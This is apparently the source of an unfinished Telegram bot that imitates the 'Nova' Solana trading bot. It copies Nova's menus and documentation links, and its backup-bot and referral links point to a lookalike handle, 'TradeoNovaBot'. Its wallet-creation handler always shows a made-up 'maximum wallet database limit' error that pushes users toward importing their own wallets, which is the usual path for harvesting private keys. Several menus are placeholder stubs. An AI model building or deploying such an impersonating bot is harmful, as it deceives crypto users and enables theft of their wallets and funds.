import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler, ContextTypes,
)
from flask import Flask
from threading import Thread

# Flask server for Render health checks
app = Flask(__name__)

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("bot_token")

# Configuration
TOKEN = BOT_TOKEN  # Replace with your bot token
WEBHOOK_URL = "https://nova-bot-m18w.onrender.com"  # Replace with your HTTPS URL
PORT = 10000  # Port to listen on (typically 443, 80, 88, or 8443)


# ------------------------------ flask ---------------------------------------------------------------
@app.route('/')
def home():
    return "Bot is running!"


def run_flask():
    app.run(host='0.0.0.0', port=8080)


# ----------------------------- TELEGRAM BOT SECTION ----------------------------------------------------

# ---------- HELPER MENU FUNCTIONS --------------------
def get_main_menu() -> tuple[str, InlineKeyboardMarkup]:
    """Return formatted main menu message and keyboard"""
    welcome_msg = """
    🌠 Welcome to Nova!

    🚀 The Fastest All-In-One Trading Platform.

    💳 Your Solana Wallets:

    None - 0 SOL ($0.00 USD)
    • Import or create new wallet to begin.
    📖<a href="https://docs.tradeonnova.io/">Guide</a>
    🐦<a href="https://x.com/TradeonNova">Twitter</a>
    👥<a href="https://t.me/NovaSupportAgent">Support Channel</a>
    ▶<a href="https://www.youtube.com/@TradeonNova">YouTube</a>

    🤖 Backup Bots:

    🇺🇸 <a href="https://t.me/TradeoNovaBot">US1</a>
    🇺🇸 <a href="https://t.me/TradeoNovaBot">US2</a>
    🇪🇺 <a href="https://t.me/TradeoNovaBot">EU1</a>

    💡 Ready to start trading? Send a token address to get started.
    """

    # Create inline keyboard buttons
    keyboard = [[InlineKeyboardButton("📈Buy", callback_data='button1'),
                 InlineKeyboardButton("💼Positions", callback_data='button2')],
                [InlineKeyboardButton("💳Wallets", callback_data='button3'),
                 InlineKeyboardButton("🎯sniper", callback_data='button4')],
                [InlineKeyboardButton("📖Limit Orders", callback_data='button5'),
                 InlineKeyboardButton("🤖Copy Trade", callback_data='button6')],
                [InlineKeyboardButton("💤AFK", callback_data='button7'),
                 InlineKeyboardButton("🕹Auto Buy", callback_data='button8')],
                [InlineKeyboardButton("🖱Nova Click", callback_data='button9'),
                 InlineKeyboardButton("💰Referrals", callback_data='button10')],
                [InlineKeyboardButton("⚙Settings", callback_data='button11'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                [InlineKeyboardButton("x Close", callback_data='button11')]
                ]
    return welcome_msg, InlineKeyboardMarkup(keyboard)


def get_buy_menu() -> tuple[str, InlineKeyboardMarkup]:
    buy_msg = """ hey1
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return buy_msg, InlineKeyboardMarkup(keyboard)


def get_positions_menu() -> tuple[str, InlineKeyboardMarkup]:
    position_msg = """hey2
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return position_msg, InlineKeyboardMarkup(keyboard)


def get_wallet_menu() -> tuple[str, InlineKeyboardMarkup]:
    """Return formatted wallet menu message and keyboard"""
    msg = """
            💳 Wallet Settings

            📚 Need more help? Click Here!

            🌐 Create, manage and import wallets here.

            💳 Your Solana Wallets:

            None - 0 SOL ($0.00 USD)
            • Import new wallet to begin.

            🔒 Tip: Keep your Nova wallets secure by setting a Security Pin below.

            💡 Select an option below.
                    """
    # Create inline keyboard buttons
    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='button2')],
                [InlineKeyboardButton("✅Change Default Wallet", callback_data='button3')],
                [InlineKeyboardButton(text="🆕Create Wallet", callback_data="create_wallet"),
                 InlineKeyboardButton(text="📥Import Wallet", callback_data="button5")],
                [InlineKeyboardButton(text="📝Rename Wallet", callback_data='button6'),
                 InlineKeyboardButton(text="🗑Delete Wallet", callback_data='button7')],
                [InlineKeyboardButton(text="💸Withdraw", callback_data='button8'),
                 InlineKeyboardButton(text="🔐EXPORT Private Key", callback_data='button9')],
                [InlineKeyboardButton(text="🔒Security Pin Setup", callback_data='button10'),
                 InlineKeyboardButton(text="⚙Settings", callback_data='button11')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_sniper_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """
🎯 Nova Sniper

📚 Need more help? <a href="https://docs.tradeonnova.io/modules/sniper">Click Here!</a>

🌐 Snipe Pump.Fun migrating tokens and new Raydium pools.

• No active sniper tasks.💡 Create and configure tasks below.
    """

    keyboard = [
        [InlineKeyboardButton("Start All", callback_data='start_all'),
         InlineKeyboardButton("⏸Stop All", callback_data='stop_all')],
        [InlineKeyboardButton("🆕New Task", callback_data='new_task'),
         InlineKeyboardButton("🗑Delete Task", callback_data='delete_task1')],
        [InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
            InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_orders_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """
🔒📖 Nova Limit Orders

🌐 Automatically trigger buy and sell trades when a token or position hits a certain market cap, price or profit level.

• No active limit orders.

💡 Orders can be created by pasting a token address.
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                [InlineKeyboardButton("🗑Delete Task", callback_data="delete_task2")],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_copy_trade_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """
    
🤖 Nova Copy Trade

🌐 Utilize blazing fast copy-trading speeds with Nova.

• No copy trade tasks found.

💡 Create a task below.
    """

    keyboard = [
        [InlineKeyboardButton("▶Start All", callback_data='start_all'),
         InlineKeyboardButton("⏸Stop All", callback_data='stop_all')],
        [InlineKeyboardButton("🆕New Task", callback_data='new_task'),
         InlineKeyboardButton("🗑Delete Task", callback_data='delete_task3')],
        [InlineKeyboardButton("⏩Mass Add", callback_data="mass_add")],
        [InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
            InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_afk_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """    
💤 Nova AFK

📚 Need more help? <a href= "https://docs.tradeonnova.io/modules/afk" >Click Here!</a>

🌐 Automatically buy into new Pump.Fun & Raydium tokens as soon as they launch based on your filters.

• No active AFK tasks.

💡 Create and configure tasks below.
    """

    keyboard = [
        [InlineKeyboardButton("▶Start All", callback_data='start_all'),
         InlineKeyboardButton("⏸Stop All", callback_data='stop_all')],
        [InlineKeyboardButton("🆕New Task", callback_data='new_task'),
         InlineKeyboardButton("🗑Delete Task", callback_data='delete_task3')],
        [InlineKeyboardButton("⏩Mass Add", callback_data="mass_add")],
        [InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
            InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_auto_buy_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """hey10
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_nova_click_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """
👆 Nova Click is LIVE! 👆

Download Nova Click here: <a href= "https://chromewebstore.google.com/detail/nova-click/agegahikpkeljmhlggpipmepoigaimdk" > Download </a>

Learn how to setup and use Nova click here:  <a href= "https://docs.tradeonnova.io/modules/nova-click" > Guide </a>

👋 Got a question? Join our <a href= "https://t.me/TradeOnNova" > Support Channel </a> for assistance.
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu')],
                [InlineKeyboardButton("x Close", callback_data="close")]
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_referrals_menu(user_id) -> tuple[str, InlineKeyboardMarkup]:
    msg = f"""    
👥 Nova Referrals

📚 Need more help? <a href= "https://docs.tradeonnova.io/earning-with-nova/referrals"> Click Here! </a>

📈 Referrals

Tier 1
• Users: 0
• Volume: 0 SOL
• Earnings: 0 SOL

Tier 2
• Users: 0
• Volume: 0 SOL
• Earnings: 0 SOL

Tier 3
• Users: 0
• Volume: 0 SOL
• Earnings: 0 SOL

💸 Payout Overview

• Total Rewards: 0 SOL
• Total Payments Sent: 0 SOL
• Total Payments Pending: 0 SOL

Your Referral Link

🔗 https://t.me/TradeoNovaBot?start=r-{user_id}

💡 Select an action below.
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


def get_settings_menu() -> tuple[str, InlineKeyboardMarkup]:
    msg = """ 
⚙️ Nova Settings

📚 Need more help? <a href="https://docs.tradeonnova.io/configuration/settings"> Click Here! </a>

💡 Select a setting you wish to change.
    """

    keyboard = [[InlineKeyboardButton("⬅Back to Menu", callback_data='main_menu'),
                 InlineKeyboardButton("🔁Refresh", callback_data='refresh_')],
                [InlineKeyboardButton("⛽fee", callback_data="fee_"),
                 InlineKeyboardButton("💦slippage", callback_data="slippage_")],
                [InlineKeyboardButton("🟢MEV Protect", callback_data="mev_protect_1"),
                 InlineKeyboardButton("🛠Buy: Ultra", callback_data="buy_ultra")],
                [InlineKeyboardButton("🟢Mev Protect", callback_data="mev_protect_2"),
                 InlineKeyboardButton("💦Sell: Ultra", callback_data="sell_ultra")],
                [InlineKeyboardButton("⚙Presets", callback_data="presets_"),
                 InlineKeyboardButton("💳Wallets", callback_data="wallets_")],
                [InlineKeyboardButton("⚡Quick Buy", callback_data="quick_buy"),
                 InlineKeyboardButton("💰Quick Sell", callback_data="quick_sell")],
                [InlineKeyboardButton("🕹Auto Buy", callback_data="auto_buy")],
                [InlineKeyboardButton("x Close", callback_data="close")],
                ]
    return msg, InlineKeyboardMarkup(keyboard)


# ---------- COMMAND HANDLERS --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    msg, markup = get_main_menu()
    await update.message.reply_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


# ---------- MENUS CALLBACK HANDLERS -------------------
async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle return to main menu"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()
    msg, markup = get_main_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle buy button (button1)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_buy_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def positions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle position button (button2)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_positions_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def wallet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle wallet button (button3)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_wallet_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def sniper_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle sniper button (button4)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_sniper_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def orders_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle orders button (button5)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_orders_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def copy_trade_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle copy_trade button (button6)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_copy_trade_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def afk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle afk button (button7)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_afk_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def auto_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle auto_buy button (button8)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_auto_buy_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def nova_click_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle nova_click button (button9)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_nova_click_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def referrals_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle referrals button (button10)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()
    user_id = query.from_user.id

    msg, markup = get_referrals_menu(user_id)
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def settings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle settings button (button11)"""
    query = update.callback_query  # Acknowledge the button press
    await query.answer()

    msg, markup = get_settings_menu()
    await query.edit_message_text(msg, reply_markup=markup, parse_mode="HTML", disable_web_page_preview=True)


async def close_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle close button"""
    query = update.callback_query
    await query.answer()
    await query.message.delete()


# ----------------- SUB-CALLBACK HANDLERS  ----------------------------------
# callback handlers for sub buttons of different menu
async def create_wallet_callback(update:Update, context:ContextTypes.DEFAULT_TYPE):
    """ Handle wallet creation"""
    query = update.callback_query # Acknowledge the button press
    await query.answer()
    chat_id = query.message.chat.id if query.message else update.effective_chat.id

    msg = "What would you like to name your new wallet?"
    await context.bot.send_message(chat_id, msg)
    context.user_data['wallet_name'] = True


# -------------------HELPER SUB-CALLBACK FUNCTIONS ------------------------------
async def handle_wallet_creations(update:Update,context:ContextTypes.DEFAULT_TYPE):
    "Handle reply for wallet creation"
    if context.user_data.get("wallet_name"):
        chat_id = update.effective_chat.id
        wallet_name = update.message.text.strip()
        msg = f"""
❌ Failed to Create Nova Wallet!

💳 Name:

{wallet_name}

⛔ Error:
Nova is currently dealing with high volumes of requests and has reached its maximum wallet database limit. We currently cannot create a new wallet, but you can still import your own wallets. Please be patient as we work on this issue. Thank you for understanding.

⚠️ Keep your private key safe and secure. Nova will no longer remember your private key, and you will no longer be able to retrieve it after this message. Please import your wallet into Phantom.

💡 To view your other wallets, head over to settings.
        """
        await context.bot.send_message(chat_id, msg)


# ----------------------- APPLICATION SETUP -------------------------------------------------------------
# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))

    # Callback handlers
    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"))
    application.add_handler(CallbackQueryHandler(buy_callback, pattern="^button1$"))
    application.add_handler(CallbackQueryHandler(positions_callback, pattern="^button2$"))
    application.add_handler(CallbackQueryHandler(wallet_callback, pattern="^button3$"))
    application.add_handler(CallbackQueryHandler(sniper_callback, pattern="^button4$"))
    application.add_handler(CallbackQueryHandler(orders_callback, pattern="^button5$"))
    application.add_handler(CallbackQueryHandler(copy_trade_callback, pattern="^button6$"))
    application.add_handler(CallbackQueryHandler(afk_callback, pattern="^button7$"))
    application.add_handler(CallbackQueryHandler(auto_buy_callback, pattern="^button8$"))
    application.add_handler(CallbackQueryHandler(nova_click_callback, pattern="^button9$"))
    application.add_handler(CallbackQueryHandler(referrals_callback, pattern="^button10$"))
    application.add_handler(CallbackQueryHandler(settings_callback, pattern="^button11$"))
    application.add_handler(CallbackQueryHandler(close_callback, pattern="^close$"))

    # sub-callback handlers
    application.add_handler(CallbackQueryHandler(create_wallet_callback, pattern="^create_wallet$"))

    # Keep existing webhook setup
    application.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        webhook_url=WEBHOOK_URL,
    )


if __name__ == "__main__":
    Thread(target=run_flask).start()
    main()
